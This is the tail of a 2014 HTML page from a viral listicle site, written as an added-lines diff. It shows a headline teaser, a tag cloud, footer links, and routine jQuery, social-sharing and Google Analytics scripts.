+					<a href="http://www.yoodot.com/10930/23-people-you-know-are-definitely-dead-now/" rel="bookmark" class="main-headline">23 People You Know Are Definitely Dead&nbsp;Now</a>
+
+					<p>And by dead, I mean not dead at all. 1....</p>
+
+					<div class="headlines-info">
+
+						<ul class="headlines-info">
+
+							<li>05.22.2014</li>
+
+							<!-- <li class="comments-icon"><a href=""></a></li> -->
+
+						</ul>
+
+					</div><!--headlines-info-->
+
+				</li>
+
+				
+			</ul>
+
+
+
+
+
+		</div><div class="sidebar-widget"><h3>tags</h3><div class="tagcloud"><a href="http://www.yoodot.com/tag/2013/" class="tag-link-210" title="35 topics" style="font-size: 10.566666666667pt;">2013</a>
+<a href="http://www.yoodot.com/tag/amazing/" class="tag-link-17" title="43 topics" style="font-size: 12.433333333333pt;">amazing</a>
+<a href="http://www.yoodot.com/tag/animals/" class="tag-link-341" title="45 topics" style="font-size: 12.9pt;">animals</a>
+<a href="http://www.yoodot.com/tag/australia/" class="tag-link-719" title="50 topics" style="font-size: 14.066666666667pt;">australia</a>
+<a href="http://www.yoodot.com/tag/awesome/" class="tag-link-99" title="66 topics" style="font-size: 16.866666666667pt;">awesome</a>
+<a href="http://www.yoodot.com/tag/baby/" class="tag-link-213" title="39 topics" style="font-size: 11.5pt;">baby</a>
+<a href="http://www.yoodot.com/tag/beautiful/" class="tag-link-68" title="45 topics" style="font-size: 12.9pt;">beautiful</a>
+<a href="http://www.yoodot.com/tag/best/" class="tag-link-28" title="59 topics" style="font-size: 15.7pt;">best</a>
+<a href="http://www.yoodot.com/tag/cats/" class="tag-link-76" title="31 topics" style="font-size: 9.4pt;">cats</a>
+<a href="http://www.yoodot.com/tag/christmas/" class="tag-link-442" title="77 topics" style="font-size: 18.266666666667pt;">Christmas</a>
+<a href="http://www.yoodot.com/tag/cute/" class="tag-link-427" title="58 topics" style="font-size: 15.466666666667pt;">cute</a>
+<a href="http://www.yoodot.com/tag/disney/" class="tag-link-95" title="43 topics" style="font-size: 12.433333333333pt;">disney</a>
+<a href="http://www.yoodot.com/tag/dogs/" class="tag-link-144" title="29 topics" style="font-size: 8.7pt;">dogs</a>
+<a href="http://www.yoodot.com/tag/ever/" class="tag-link-631" title="28 topics" style="font-size: 8.2333333333333pt;">Ever</a>
+<a href="http://www.yoodot.com/tag/facebook/" class="tag-link-93" title="58 topics" style="font-size: 15.466666666667pt;">facebook</a>
+<a href="http://www.yoodot.com/tag/fails/" class="tag-link-52" title="54 topics" style="font-size: 14.766666666667pt;">fails</a>
+<a href="http://www.yoodot.com/tag/food/" class="tag-link-33" title="44 topics" style="font-size: 12.666666666667pt;">food</a>
+<a href="http://www.yoodot.com/tag/from/" class="tag-link-145" title="27 topics" style="font-size: 8pt;">from</a>
+<a href="http://www.yoodot.com/tag/funny/" class="tag-link-79" title="42 topics" style="font-size: 12.2pt;">funny</a>
+<a href="http://www.yoodot.com/tag/hilarious/" class="tag-link-50" title="42 topics" style="font-size: 12.2pt;">hilarious</a>
+<a href="http://www.yoodot.com/tag/house/" class="tag-link-971" title="29 topics" style="font-size: 8.7pt;">house</a>
+<a href="http://www.yoodot.com/tag/kids/" class="tag-link-481" title="37 topics" style="font-size: 11.033333333333pt;">kids</a>
+<a href="http://www.yoodot.com/tag/life/" class="tag-link-44" title="34 topics" style="font-size: 10.1pt;">life</a>
+<a href="http://www.yoodot.com/tag/love/" class="tag-link-414" title="54 topics" style="font-size: 14.766666666667pt;">love</a>
+<a href="http://www.yoodot.com/tag/makeup/" class="tag-link-127" title="35 topics" style="font-size: 10.566666666667pt;">makeup</a>
+<a href="http://www.yoodot.com/tag/mind/" class="tag-link-807" title="28 topics" style="font-size: 8.2333333333333pt;">Mind</a>
+<a href="http://www.yoodot.com/tag/most/" class="tag-link-151" title="81 topics" style="font-size: 18.733333333333pt;">most</a>
+<a href="http://www.yoodot.com/tag/olympics/" class="tag-link-1712" title="28 topics" style="font-size: 8.2333333333333pt;">olympics</a>
+<a href="http://www.yoodot.com/tag/parenting/" class="tag-link-2211" title="28 topics" style="font-size: 8.2333333333333pt;">parenting</a>
+<a href="http://www.yoodot.com/tag/people/" class="tag-link-195" title="66 topics" style="font-size: 16.866666666667pt;">people</a>
+<a href="http://www.yoodot.com/tag/photography/" class="tag-link-669" title="33 topics" style="font-size: 9.8666666666667pt;">Photography</a>
+<a href="http://www.yoodot.com/tag/photos/" class="tag-link-74" title="90 topics" style="font-size: 19.9pt;">photos</a>
+<a href="http://www.yoodot.com/tag/pictures/" class="tag-link-64" title="28 topics" style="font-size: 8.2333333333333pt;">pictures</a>
+<a href="http://www.yoodot.com/tag/reasons/" class="tag-link-445" title="30 topics" style="font-size: 8.9333333333333pt;">Reasons</a>
+<a href="http://www.yoodot.com/tag/tattoos/" class="tag-link-57" title="30 topics" style="font-size: 8.9333333333333pt;">tattoos</a>
+<a href="http://www.yoodot.com/tag/these/" class="tag-link-75" title="111 topics" style="font-size: 22pt;">these</a>
+<a href="http://www.yoodot.com/tag/things/" class="tag-link-283" title="48 topics" style="font-size: 13.6pt;">things</a>
+<a href="http://www.yoodot.com/tag/this/" class="tag-link-191" title="28 topics" style="font-size: 8.2333333333333pt;">this</a>
+<a href="http://www.yoodot.com/tag/time/" class="tag-link-165" title="27 topics" style="font-size: 8pt;">time</a>
+<a href="http://www.yoodot.com/tag/video/" class="tag-link-1084" title="45 topics" style="font-size: 12.9pt;">video</a>
+<a href="http://www.yoodot.com/tag/when/" class="tag-link-263" title="41 topics" style="font-size: 11.966666666667pt;">when</a>
+<a href="http://www.yoodot.com/tag/will/" class="tag-link-1837" title="29 topics" style="font-size: 8.7pt;">will</a>
+<a href="http://www.yoodot.com/tag/with/" class="tag-link-104" title="47 topics" style="font-size: 13.366666666667pt;">with</a>
+<a href="http://www.yoodot.com/tag/world/" class="tag-link-154" title="47 topics" style="font-size: 13.366666666667pt;">world</a>
+<a href="http://www.yoodot.com/tag/your/" class="tag-link-30" title="66 topics" style="font-size: 16.866666666667pt;">your</a></div>
+</div>	</div><!--side-->
+</div><!--sidebar-wrapper-->			</div><!--container-->
+
+		</div><!--inner-wrapper-->
+
+	</div><!--wrapper-->
+
+	<div id="footer-top-wrapper">
+
+		<div id="footer-top">
+
+			
+		</div><!--footer-top-->
+
+	</div><!--footer-top-wrapper-->
+
+	<div id="footer-bottom-wrapper">
+
+		<div id="footer-bottom">
+
+			<div id="footer-nav1">
+
+				<div class="menu-footer-container"><ul id="menu-footer" class="menu"><li id="menu-item-22" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-22"><a href="http://www.zdouf.com">Home</a></li>
+<li id="menu-item-20" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-20"><a href="http://www.yoodot.com/terms-of-service/">Terms of Service</a></li>
+<li id="menu-item-21" class="menu-item menu-item-type-post_type menu-item-object-page current-menu-item page_item page-item-11 current_page_item menu-item-21"><a href="http://www.yoodot.com/privacy-policy/">Privacy Policy</a></li>
+</ul></div>
+			</div><!--footer-nav1-->
+
+			<div id="copyright">
+
+				<p>Copyright © 2014 yoodot.com | contact info[at]yoodot.com</p>
+
+			</div><!--copyright-->
+
+		</div><!--footer-bottom-->
+
+	</div><!--footer-bottom-wrapper-->
+
+</div><!--site-->
+
+
+
+
+<script type="text/javascript">
+
+jQuery(document).ready(function($){
+
+  $(window).load(function(){
+
+    $('.flexslider').flexslider({
+
+	animation: 'fade',
+
+	slideshowSpeed: 8000
+
+    });
+
+  });
+
+
+
+	var aboveHeight = $('#leader-wrapper').outerHeight();
+
+        $(window).scroll(function(){
+
+                if ($(window).scrollTop() > aboveHeight){
+
+                $('#nav').addClass('fixed-nav').css('top','0').next()
+
+                .css('padding-top','43px');
+
+                } else {
+
+                $('#nav').removeClass('fixed-nav').next()
+
+                .css('padding-top','0');
+
+                }
+
+        });
+
+
+
+});
+
+</script><script type="text/javascript" src="http://www.yoodot.com/wp-includes/js/comment-reply.min.js?ver=3.9.2"></script>
+<script type="text/javascript" src="http://www.yoodot.com/wp-content/themes/maxmag/theia-post-slider/js/tps.js?ver=1.0.8"></script>
+
+
+
+<script type="text/javascript">
+
+jQuery(document).ready(function($){
+
+$('.carousel').elastislide({
+
+	imageW 	: 120,
+
+	minItems	: 2,
+
+	margin		: 10
+
+});
+
+if ( jQuery("iframe[title='fb:post Facebook Social Plugin']") ) {
+    jQuery("iframe[title='fb:post Facebook Social Plugin']").attr( "height", "620");
+}
+
+});
+
+jQuery('#btm-share').live("click",function(event){
+event.preventDefault();
+var child=window.open('https://www.facebook.com/sharer/sharer.php?u='+encodeURIComponent(location.href),'facebook-share-dialog','width=650,height=450'); 
+});
+
+</script>
+
+
+
+
+<script type="text/javascript">
+
+//<![CDATA[
+
+!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.async=true;js.src="https://platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}}(document,"script","twitter-wjs");
+
+//]]>
+
+</script>
+
+
+
+<script type="text/javascript">
+
+//<![CDATA[
+
+  (function() {
+
+    var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+
+    po.src = 'https://apis.google.com/js/plusone.js';
+
+    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+
+  })();
+
+//]]>
+
+</script>
+
+
+
+<script type="text/javascript">
+  (function() {
+    var li = document.createElement('script'); li.type = 'text/javascript'; li.async = true;
+    li.src = ('https:' == document.location.protocol ? 'https:' : 'http:') + '//platform.stumbleupon.com/1/widgets.js';
+    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(li, s);
+  })();
+</script>
+
+
+
+
+
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-24562607-17', 'yoodot.com');
+  ga('send', 'pageview');
+
+</script>
+<script type="text/javascript" src="//assets.pinterest.com/js/pinit.js"></script>
+
+	
+	<div id="stay-tuned" style="display:none;">
+        <div style="float:left; width:290px;">We can make your day better. Like us and stay tuned!</div>
+        <div class="fb-like-box" data-href="http://www.facebook.com/524035844353787" data-height="200" data-colorscheme="light" data-show-faces="true" data-header="false" data-stream="false" data-show-border="false"></div>
+    </div>
+
+
+</body></html>
